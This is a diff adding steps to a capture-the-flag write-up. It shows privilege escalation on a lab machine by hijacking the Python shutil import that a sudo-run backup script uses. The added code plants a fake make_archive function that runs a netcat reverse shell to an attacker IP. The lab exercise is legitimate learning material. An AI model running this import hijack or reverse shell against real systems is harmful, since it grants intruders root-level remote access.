@@ -215,9 +215,24 @@ Even better, we `ls` and instantly get a <em><strong>user.txt</em></strong flag.
 
 ![Mikey_being_a_savage](https://user-images.githubusercontent.com/110210595/189811176-4242071c-ed25-459e-b09c-ed082c04153d.png)
 
-Now I start off with `sudo -l` to see what sudo permissions we have. (ALL) SETENV: /opt/scripts/admin_tasks.sh
-I cd /opt/scripts/ and there are two files here:
+Now I start off with `sudo -l` to see what sudo permissions we have. <em><strong>(ALL) SETENV: /opt/scripts/admin_tasks.sh</em></strong><br>
+I `cd /opt/scripts/` and there are two files here:<br>
 admin_tasks.sh - backup.py
-I do ls -la and we don't have any permissions. We can only read them.
-cat admin_tasks.sh
-It seems to be backing up passwords from /etc/passwd, /etc/shadow, to a passwd.bak and shadow.bak. From backup.py
+I do `ls -la` and we don't have any permissions. We can only read them.<br>
+<em><strong>cat admin_tasks.sh</em></strong><br>
+It seems to be backing up passwords from /etc/passwd, /etc/shadow, to a passwd.bak and shadow.bak. From backup.py<br>
+
+I now do cat backup.py
+
+![back_py_results](https://user-images.githubusercontent.com/110210595/189811516-8ad3969c-0d41-4bf6-9da6-b534244e8368.PNG)
+
+It is doing an import from make_archive using a script called shutil.py<br> 
+I try to write the shutil.py script with nano to get a reverse shell back in the /opt/scripts/ directory but we get permission denied when trying to save. So I go to /tmp and write it there. I use the follow script from ippsec.<br>
+
+`nano shutil.py`
+
+```import os, socket, subprocess
+
+def make_archive(a , b, c):
+os.system("nc -c bash 10.10.14.14 9001")
+```
